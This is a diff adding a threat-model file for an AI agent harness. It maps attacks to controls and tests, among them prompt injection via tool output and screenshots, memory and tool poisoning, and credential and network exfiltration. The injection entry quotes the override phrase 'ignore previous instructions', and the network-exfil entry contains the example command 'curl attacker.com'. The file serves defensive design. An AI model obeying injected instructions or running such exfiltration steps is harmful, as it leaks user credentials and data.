@@ -1,0 +1,131 @@
+# Threats
+- threat_id: THREAT-TOCTOU-001
+  threat: Approval-to-execution TOCTOU
+  asset: ASSET-002
+  trust_boundary: TB-001
+  attack_preconditions: [Attacker can modify manifest after approval]
+  attack_steps: [User approves manifest A, Attacker swaps to B, Tool executes B]
+  control_ids: [CTRL-REVALIDATE-001]
+  implementation_location: harness/security/revalidate.ts
+  test_fixture: tests/security/toctou.test.ts
+  expected_result: Manifest hash mismatch detected, execution denied
+  residual_risk: none
+
+- threat_id: THREAT-SSRF-001
+  threat: SSRF via web_fetch
+  asset: ASSET-001
+  trust_boundary: TB-002
+  attack_preconditions: [Agent can call web_fetch]
+  attack_steps: [Agent fetches internal URL, Internal service responds]
+  control_ids: [CTRL-EGRESS-001]
+  implementation_location: harness/security/egress-filter.ts
+  test_fixture: tests/security/ssrf.test.ts
+  expected_result: Internal URL blocked by egress policy
+  residual_risk: none
+
+- threat_id: THREAT-INDIRECT-INJECTION
+  threat: Indirect prompt injection via tool output
+  asset: ASSET-006
+  trust_boundary: TB-006
+  attack_preconditions: [Tool output contains malicious instructions]
+  attack_steps: [web_fetch returns page with ignore previous instructions, LLM follows injected instruction]
+  control_ids: [CTRL-TAINT-001]
+  implementation_location: harness/security/taint.ts
+  test_fixture: tests/security/injection.test.ts
+  expected_result: Taint label prevents instruction override
+  residual_risk: low
+
+- threat_id: THREAT-MEMORY-POISONING
+  threat: Memory poisoned by malicious input
+  asset: ASSET-007
+  trust_boundary: TB-006
+  control_ids: [CTRL-MEMORY-VERIFY-001]
+  implementation_location: harness/memory/verification.ts
+  test_fixture: tests/security/memory-poison.test.ts
+  residual_risk: medium
+
+- threat_id: THREAT-TOOL-POISONING
+  threat: Malicious MCP tool
+  asset: ASSET-006
+  trust_boundary: TB-006
+  control_ids: [CTRL-PLUGIN-SIGN-001]
+  implementation_location: harness/tools/mcp-host.ts
+  test_fixture: tests/security/tool-poison.test.ts
+  residual_risk: low
+
+- threat_id: THREAT-CAPABILITY-REPLAY
+  threat: Capability token replay
+  asset: ASSET-002
+  trust_boundary: TB-001
+  control_ids: [CTRL-CAPABILITY-SINGLE-USE-001]
+  implementation_location: harness/security/capability.ts
+  test_fixture: tests/security/capability-replay.test.ts
+  residual_risk: none
+
+- threat_id: THREAT-CONTEXT-LEAK
+  threat: Multi-agent context leak and permission bypass via RAG retrieval
+  asset: ASSET-003
+  trust_boundary: TB-005
+  control_ids: [CTRL-CONTEXT-ISOLATION-001, CTRL-VFS-001]
+  implementation_location: harness/router/context-graph.ts
+  test_fixture: tests/security/context-leak.test.ts
+  expected_result: Context isolation enforced; RAG retrieval cannot bypass read_file deny because both go through VFS
+  residual_risk: low
+  residual_risk: low
+
+- threat_id: THREAT-BUDGET-BYPASS
+  threat: Router bypasses budget
+  asset: ASSET-001
+  trust_boundary: TB-001
+  control_ids: [CTRL-BUDGET-PEP-001]
+  implementation_location: harness/security/budget-guard.ts
+  test_fixture: tests/security/budget-bypass.test.ts
+  residual_risk: none
+
+- threat_id: THREAT-SCREEN-INJECTION
+  threat: Prompt injection via screenshot feedback in computer use
+  asset: ASSET-006
+  trust_boundary: TB-006
+  attack_preconditions: [Agent uses computer_use, attacker controls on-screen content or agent own output is visible]
+  attack_steps: [Attacker renders malicious text on screen, Screenshot captures it, LLM treats pixels as instruction]
+  control_ids: [CTRL-SCREEN-ISOLATION-001, CTRL-TAINT-001]
+  implementation_location: harness/security/screen-isolation.ts
+  test_fixture: tests/security/screen-injection.test.ts
+  expected_result: Agent own output excluded from screenshots, per-app approval enforced, injection blocked
+  residual_risk: low
+
+- threat_id: THREAT-CRED-REACH
+  threat: Credential exfiltration via compromised agent loop
+  asset: ASSET-002
+  trust_boundary: TB-001
+  attack_preconditions: [Agent loop compromised by indirect injection or tool poisoning, tool requiring credentials is callable]
+  attack_steps: [Injection compromises loop, Loop calls credentialed tool, Broker exchanges credential into process env, Second tool call exfils credential to attacker host]
+  control_ids: [CTRL-RUNPHASE-001, CTRL-CRED-REACH-001, CTRL-EGRESS-002]
+  implementation_location: harness/security/run-phase.ts
+  test_fixture: tests/security/cred-reach.test.ts
+  expected_result: Agent phase offline by default, credentials stripped before agent phase, single-exchange scoped to one dispatch
+  residual_risk: low
+
+- threat_id: THREAT-NETWORK-EXFIL
+  threat: Data exfiltration via allowed-network command (DNS rebinding, CDN, legit domain)
+  asset: ASSET-001
+  trust_boundary: TB-002
+  attack_preconditions: [Sandboxed command has network access, IP allowlist only]
+  attack_steps: [Agent runs curl attacker.com which resolves to allowed CDN, or npm i malicious package phones home]
+  control_ids: [CTRL-EGRESS-002]
+  implementation_location: harness/security/network-policy.ts
+  test_fixture: tests/security/network-exfil.test.ts
+  expected_result: Domain-level policy blocks exfil even when IP allowlist passes
+  residual_risk: low
+
+- threat_id: THREAT-MSG-TAMPER
+  threat: Cross-process agent message tampering or forgery
+  asset: ASSET-003
+  trust_boundary: TB-005
+  attack_preconditions: [Agents execute across processes/hosts, message broker or store is accessible]
+  attack_steps: [Attacker with broker access modifies a message in queue, Receiving agent executes tampered task, or forged message impersonates an agent to exceed OBO permissions]
+  control_ids: [CTRL-MSG-INTEGRITY-001]
+  implementation_location: harness/security/msg-integrity.ts
+  test_fixture: tests/security/msg-tamper.test.ts
+  expected_result: JWS signature mismatch detected, tampered message rejected; OBO token prevents permission escalation
+  residual_risk: low
